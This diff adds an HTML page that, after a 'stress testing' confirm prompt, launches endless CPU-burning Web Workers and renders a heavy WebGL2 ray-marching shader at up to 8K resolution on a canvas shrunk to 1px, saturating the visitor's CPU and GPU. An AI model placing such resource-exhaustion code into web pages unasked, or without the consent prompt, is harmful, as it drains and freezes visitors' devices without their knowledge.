@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>😈</title>
+    <style>
+        body { 
+            margin: 0; 
+            padding: 0; 
+            background: #000; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            overflow: hidden; 
+        }
+        .emoji { 
+            font-size: 150px; 
+            user-select: none; 
+            text-shadow: 0 0 50px rgba(255, 0, 0, 0.8);
+            animation: breathe 2s infinite ease-in-out;
+        }
+        @keyframes breathe {
+            0%, 100% { transform: scale(1); text-shadow: 0 0 50px rgba(255, 0, 0, 0.8); }
+            50% { transform: scale(1.1); text-shadow: 0 0 100px rgba(255, 0, 0, 1); }
+        }
+        .sleeping {
+            text-shadow: 0 0 10px rgba(100, 100, 100, 0.5);
+            animation: none;
+        }
+        #gpuCanvas { 
+            position: absolute; 
+            width: 1px; 
+            height: 1px; 
+            opacity: 1; 
+            pointer-events: none;
+            z-index: -1;
+        }
+    </style>
+</head>
+<body>
+    <div id="face" class="emoji">😈</div>
+    <canvas id="gpuCanvas"></canvas>
+
+    <script>
+        function init() {
+            const WORKER_COUNT = navigator.hardwareConcurrency * 2 || 8;
+
+            const workerScript = `
+                self.onmessage = function(e) {
+                    let v1 = 1.12345, v2 = 2.54321, v3 = 3.98765;
+                    let intVal = 0xFFFFFFFF;
+                    let loops = 0;
+
+                    while(true) {
+                        for(let i = 1; i < 2000000; i++) {
+                            v1 = Math.sin(v2 * i) + Math.cos(v3 / i);
+                            v2 = Math.sqrt(Math.abs(v1 * v3 + i));
+                            v3 = Math.tan(v1 + v2);
+
+                            intVal = Math.imul((intVal ^ i), 0x01000193); 
+                            intVal = (intVal >>> 0) ^ (intVal << 3); 
+                            intVal = intVal >>> 0;
+                        }
+                        loops++;
+                        self.postMessage({v1, intVal, loops});
+                    }
+                };
+            `;
+
+            const workerBlobUrl = URL.createObjectURL(new Blob([workerScript], { type: 'application/javascript' }));
+            for (let i = 0; i < WORKER_COUNT; i++) {
+                const worker = new Worker(workerBlobUrl);
+                worker.postMessage('start');
+            }
+
+            const vsSource = `#version 300 es
+                in vec2 a_position;
+                void main() { gl_Position = vec4(a_position, 0.0, 1.0); }
+            `;
+
+            const fsSource = `#version 300 es
+                precision highp float;
+                layout(std140) uniform Uniforms {
+                    vec4 cameraPos; vec4 cameraLookAt; vec4 lightDir; vec4 lightColor;
+                    vec4 params1; vec4 params2; vec4 params3;
+                } u;
+                out vec4 fragColor;
+
+                float hash12(vec2 p) { vec3 p3 = fract(vec3(p.xyx) * .1031); p3 += dot(p3, p3.yzx + 33.33); return fract((p3.x + p3.y) * p3.z); }
+                float noise(vec2 p) { vec2 i = floor(p); vec2 f = fract(p); vec2 u_val = f * f * (3.0 - 2.0 * f); return mix(mix(hash12(i), hash12(i + vec2(1.0, 0.0)), u_val.x), mix(hash12(i + vec2(0.0, 1.0)), hash12(i + vec2(1.0, 1.0)), u_val.x), u_val.y) * 2.0 - 1.0; }
+                mat2 rot2D(float a) { float s = sin(a); float c = cos(a); return mat2(c, -s, s, c); }
+                float fbm(vec2 p) { float v = 0.0; float a = 0.5; vec2 pp = p; mat2 rot = rot2D(0.5); for(int i = 0; i < 4; i++){ v += a * noise(pp); pp = rot * pp * 2.0 + vec2(1.2, 3.4); a *= 0.5; } return v; }
+                float hash33(vec3 p) { vec3 p3 = fract(p * .1031); p3 += dot(p3, p3.zyx + 31.32); return fract((p3.x + p3.y) * p3.z); } 
+                float noise3D(vec3 p) { vec3 i = floor(p); vec3 f = fract(p); vec3 u_val = f * f * (3.0 - 2.0 * f); return mix(mix(mix(hash33(i), hash33(i + vec3(1,0,0)), u_val.x), mix(hash33(i + vec3(0,1,0)), hash33(i + vec3(1,1,0)), u_val.x), u_val.y), mix(mix(hash33(i + vec3(0,0,1)), hash33(i + vec3(1,0,1)), u_val.x), mix(hash33(i + vec3(0,1,1)), hash33(i + vec3(1,1,1)), u_val.x), u_val.y), u_val.z); }
+                float fbm3D_Fog(vec3 p) { float v = 0.0; float a = 0.5; vec3 pp = p; for(int i = 0; i < 2; i++){ v += a * noise3D(pp); pp = pp * 2.0 + vec3(0.1); a *= 0.5; } return v; }
+
+                float getWaterHeight(vec3 p) {
+                    float t = u.params1.y; vec2 m1 = vec2(t * .06, t * .03); vec2 m2 = vec2(-t * .20, t * .25); 
+                    return (fbm(p.xz * .4 + m1) * 1.5 + fbm(p.xz * 0.8 - m2) * .06) * .25;
+                }
+
+                vec2 map(vec3 p_in) {
+                    vec3 p = p_in; vec2 rxz = rot2D(u.params2.y) * p.xz; p = vec3(rxz.x, p.y, rxz.y);
+                    float s = 1.0; float t = u.params1.x * .1; 
+                    for(int i = 0; i < 5; i++){ 
+                        p = abs(p) - vec3(.4, .3, .3); vec2 xy = rot2D(.5 + t * .1) * p.xy; p = vec3(xy.x, xy.y, p.z); 
+                        vec2 xz = rot2D(.8 - t * .05) * p.xz; p = vec3(xz.x, p.y, xz.y); p = p * 1.5; s = s * 1.5; 
+                    }
+                    float dF = (length(max(abs(p) - vec3(.1, 2., .1), vec3(0.))) - .05) / s; 
+                    float dW = p_in.y - (-1.2);
+                    return vec2(min(dF, dW), step(dW, dF) * 1. + 1.); 
+                }
+
+                vec3 calcNormal(vec3 p) { float e = 0.001; vec2 k = vec2(1., -1.); return normalize(k.xyy * map(p + k.xyy * e).x + k.yyx * map(p + k.yyx * e).x + k.yxy * map(p + k.yxy * e).x + k.xxx * map(p + k.xxx * e).x); }
+                vec2 rayMarch(vec3 ro, vec3 rd, float maxD) { float t = 0.1; for(int i = 0; i < 256; i++){ vec2 res = map(ro + rd * t); if(res.x < .0015){ return vec2(t, res.y); } if(t > maxD){ break; } t += res.x * .8; } return vec2(-1., -1.); }
+                
+                float softShadow(vec3 ro, vec3 rd, float k) {
+                    int samples = int(u.params3.y); float res = 1.0; float t = 0.05;
+                    for(int i = 0; i < 64; i++){ 
+                        if(i >= samples){ break; }
+                        float h = map(ro + rd * t).x; res = min(res, k * h / t); t += clamp(h, 0.02, 0.2); 
+                        if(res < .01 || t > 8.) { break; } 
+                    } return clamp(res, 0., 1.);
+                }
+
+                vec3 getSkyColor(vec3 rd) {
+                    vec3 sunDir = normalize(u.lightDir.xyz); float sh = sunDir.y; float sd = max(dot(rd, sunDir), 0.);
+                    vec3 col = mix(mix(vec3(.6,.3,.1), vec3(.4,.45,.6), smoothstep(-.1, .4, sh)), mix(vec3(.02,.02,.05), vec3(.02,.05,.15), smoothstep(-.2, .5, sh)), max(rd.y + .05, 0.));
+                    col += u.lightColor.xyz * pow(sd, 20.) * 0.5;
+                    float t = u.params1.y * 0.1; vec2 skyPos = (rd.xz / (rd.y + 0.15)) * 1.5;
+                    float val = fbm(skyPos + vec2(t, t * 0.5)); val += fbm(skyPos * 2.5 - vec2(t * 0.5, 0.)) * 0.5;
+                    float cloudDen = smoothstep(0.1, 0.85, val) * smoothstep(0.0, 0.4, rd.y); 
+                    if (cloudDen > 0.01) { vec3 base = vec3(0.85); vec3 scatter = u.lightColor.xyz * pow(sd, 12.0) * 1.5; col = mix(col, base + scatter, cloudDen); }
+                    vec3 sunCore = vec3(1.0, 0.95, 0.9) * pow(sd, 1024.0) * 100.0; col += sunCore * (1.0 - cloudDen);
+                    return col;
+                }
+
+                void main() {
+                    vec2 id = gl_FragCoord.xy; float asp = u.params1.z / u.params1.w; 
+                    vec3 cp = u.cameraPos.xyz; vec3 cl = u.cameraLookAt.xyz;
+                    vec3 f = normalize(cl - cp); vec3 r = normalize(cross(f, vec3(0, 1, 0))); vec3 up = cross(r, f);
+                    vec2 uv = vec2((id.x + 0.5) / u.params1.z * 2. - 1., (id.y + 0.5) / u.params1.w * 2. - 1.);
+                    vec3 rd = normalize(f + (r * uv.x * asp + up * uv.y) / u.params2.x);
+                    
+                    vec3 col = vec3(0.); vec3 tp = vec3(1.); vec3 cro = cp; vec3 crd = rd; 
+                    vec3 sunD = normalize(u.lightDir.xyz); vec3 sunC = u.lightColor.xyz * u.lightDir.w * 4.0; 
+                    
+                    for(int b = 0; b < 12; b++){
+                        if(b >= int(u.params2.z)){ break; }
+                        vec2 hit = rayMarch(cro, crd, u.params3.x);
+                        if(hit.x > 0.){
+                            vec3 hp = cro + crd * hit.x; float sha = softShadow(hp, sunD, 8.);
+                            if(hit.y > 1.5){
+                                float h = getWaterHeight(hp); float e = .05; 
+                                vec3 n = normalize(mix(vec3(0, 1, 0), normalize(vec3(h - getWaterHeight(hp + vec3(e, 0, 0)), e, h - getWaterHeight(hp + vec3(0, 0, e)))), .8));
+                                float ndoth = max(dot(n, normalize(sunD - crd)), 0.); float spe = pow(ndoth, 600.); float glow = pow(ndoth, 1000.0) * 0.8; 
+                                col += tp * (vec3(.005, .01, .02) * .3 * (.5 + .5 * sha) + sunC * (spe + glow) * sha * 1.5);
+                                float f0 = .02; tp *= f0 + (1. - f0) * pow(1. - max(dot(-crd, n), 0.), 5.); cro = hp + n * .05; crd = reflect(crd, n);
+                            } else {
+                                vec3 n = calcNormal(hp); vec3 hal = normalize(sunD - crd); float ndoth = max(dot(n, hal), 0.0); float spe = pow(ndoth, 2. / (.12 * .12));
+                                vec3 metalGlow = vec3(1.0, 0.8, 0.4) * pow(ndoth, 12.0) * 0.8 * sha; 
+                                col += tp * (vec3(.85, .65, .25) * vec3(.04, .04, .05) * u.lightColor.w * .5 + (vec3(1.2, 1., .8) * spe * sha * sunC + metalGlow));
+                                vec3 f0 = vec3(.85, .65, .25); tp *= (f0 + (vec3(1.) - f0) * pow(1. - max(dot(-crd, n), 0.), 5.)) * .8; cro = hp + n * .01; crd = reflect(crd, n);
+                            }
+                        } else { col += tp * getSkyColor(crd); break; }
+                        if(length(tp) < .002){ break; }
+                    }
+
+                    vec2 ph = rayMarch(cp, rd, u.params3.x); float fl = min(150., u.params3.x); float md = (ph.x > 0.) ? min(fl, ph.x) : fl;
+                    float sl = md / 12.; vec3 fa = vec3(0.); float ft = 1.; 
+                    for(int i = 1; i <= 12; i++){
+                        float t = sl * float(i); vec3 p = cp + rd * t; if(p.y < -2.5 || p.y > 1.5){ continue; }
+                        float den = smoothstep(.2, .8, fbm3D_Fog(p * .5 + u.params1.y * .1)) * exp(-(p.y + 1.) * 2.) * .08;
+                        if(den > .001){ 
+                            float sha = softShadow(p, normalize(u.lightDir.xyz), 8.) * min(1., 4. * map(p).x / t);
+                            fa += (u.lightColor.xyz * sunC * sha + vec3(.02, .025, .03) * .5) * den * sl * ft; ft *= exp(-den * sl); 
+                        }
+                        if(ft < .05){ break; }
+                    }
+                    col += fa;
+                    
+                    col *= 1.3; float lum = dot(col, vec3(0.2126, 0.7152, 0.0722)); col = mix(vec3(lum), col, 1.2);
+                    col = clamp((col * (2.51 * col + .03)) / (col * (2.43 * col + .59) + .14), vec3(0.), vec3(1.));
+                    fragColor = vec4(pow(clamp(col, 0.0, 1.0), vec3(0.4545)), 1.);
+                }
+            `;
+
+            const canvas = document.getElementById('gpuCanvas');
+            const gl = canvas.getContext('webgl2', { powerPreference: "high-performance", desynchronized: true });
+
+            const maxTexSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
+            const TEX_W = Math.min(7680, maxTexSize);
+            const TEX_H = Math.min(4320, maxTexSize);
+
+            canvas.width = TEX_W;
+            canvas.height = TEX_H;
+
+            gl.bindFramebuffer(gl.FRAMEBUFFER, null);
+            gl.viewport(0, 0, TEX_W, TEX_H);
+
+            gl.viewport(0, 0, TEX_W, TEX_H);
+
+            const quadBuffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, quadBuffer);
+            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 1, -1, -1, 1, -1, 1, 1, -1, 1, 1]), gl.STATIC_DRAW);
+
+            const uboBuffer = gl.createBuffer();
+            gl.bindBuffer(gl.UNIFORM_BUFFER, uboBuffer);
+            gl.bufferData(gl.UNIFORM_BUFFER, 112, gl.DYNAMIC_DRAW); 
+            gl.bindBufferBase(gl.UNIFORM_BUFFER, 0, uboBuffer); 
+
+            function createShader(type, source) {
+                const shader = gl.createShader(type);
+                gl.shaderSource(shader, source);
+                gl.compileShader(shader);
+                return shader;
+            }
+
+            const program = gl.createProgram();
+            gl.attachShader(program, createShader(gl.VERTEX_SHADER, vsSource));
+            gl.attachShader(program, createShader(gl.FRAGMENT_SHADER, fsSource));
+            gl.linkProgram(program);
+
+            const uboIndex = gl.getUniformBlockIndex(program, "Uniforms");
+            gl.uniformBlockBinding(program, uboIndex, 0);
+
+            const posLoc = gl.getAttribLocation(program, "a_position");
+            gl.bindBuffer(gl.ARRAY_BUFFER, quadBuffer);
+            gl.enableVertexAttribArray(posLoc);
+            gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);
+
+            const state = {
+                yaw: Math.PI / 2, pitch: 0.0, radius: 4.0,
+                camPos: [0, 0, 0], camLookAt: [0, 0.0, 0],
+                fractalTime: 0.0, waterTime: 0.0, fractalRotAngle: 0.0
+            };
+
+            const ZOOM = 2.00;             
+            const BOUNCES = 12.0;          
+            const FAR_CLIP = 300.0;        
+            const SHADOW_SAMPLES = 48.0;   
+            const FLAGS = 1 | 2 | 4 | 8;   
+            
+            let lastDt = performance.now();
+            
+            const syncs = [];
+            const MAX_IN_FLIGHT = 2; 
+            const channel = new MessageChannel();
+
+            const gpuLoop = () => {
+                while (syncs.length > 0) {
+                    const res = gl.clientWaitSync(syncs[0], 0, 0);
+                    if (res === gl.TIMEOUT_EXPIRED || res === gl.WAIT_FAILED) break;
+                    gl.deleteSync(syncs.shift());
+                }
+
+                if (syncs.length >= MAX_IN_FLIGHT) {
+                    setTimeout(() => channel.port1.postMessage(null), 1);
+                    return;
+                }
+
+                const now = performance.now();
+                const dt = (now - lastDt) * 0.001;
+                lastDt = now;
+
+                state.fractalRotAngle += dt * 0.05;
+                state.waterTime += dt * 1.0;
+                
+                const sunAngle = 0.1 + 0.25 * (Math.PI - 0.2); 
+                const lightDir = [Math.cos(sunAngle), Math.sin(sunAngle), 0.2];
+                const sunH = Math.sin(sunAngle);
+                const sunColor = [1.0, Math.min(1.0, 0.4 + sunH * 1.5), Math.min(1.0, 0.1 + sunH * 2.0), 0.5 + sunH * 0.5];
+                const intensity = 1.2 + sunH * 1.2; 
+
+                state.camPos[0] = state.radius * Math.cos(state.pitch) * Math.cos(state.yaw);
+                state.camPos[1] = state.radius * Math.sin(state.pitch);
+                state.camPos[2] = state.radius * Math.cos(state.pitch) * Math.sin(state.yaw);
+
+                const uData = new Float32Array(28);
+                uData.set([...state.camPos, 0], 0);
+                uData.set([...state.camLookAt, 0], 4);
+                uData.set([...lightDir, intensity], 8);
+                uData.set(sunColor, 12); 
+                uData.set([state.fractalTime, state.waterTime, TEX_W, TEX_H], 16);
+                uData.set([ZOOM, state.fractalRotAngle, BOUNCES, FLAGS], 20);
+                uData.set([FAR_CLIP, SHADOW_SAMPLES, 0, 0], 24);
+
+                gl.bindBuffer(gl.UNIFORM_BUFFER, uboBuffer);
+                gl.bufferSubData(gl.UNIFORM_BUFFER, 0, uData);
+
+                gl.useProgram(program);
+                gl.drawArrays(gl.TRIANGLES, 0, 6);
+
+                syncs.push(gl.fenceSync(gl.SYNC_GPU_COMMANDS_COMPLETE, 0));
+                gl.flush();
+
+                channel.port1.postMessage(null);
+            };
+
+            channel.port2.onmessage = gpuLoop;
+            channel.port1.postMessage(null);
+        }
+
+        const msg = "⚠️This page is for stress testing. You may experience performance drops or stuttering.\nClick OK to start.";
+
+        setTimeout(() => {
+            if (confirm(msg)) {
+                init();
+            } else {
+                const face = document.getElementById('face');
+                face.textContent = '😴';
+                face.classList.add('sleeping');
+            }
+        }, 100);
+    </script>
+</body>
+</html>
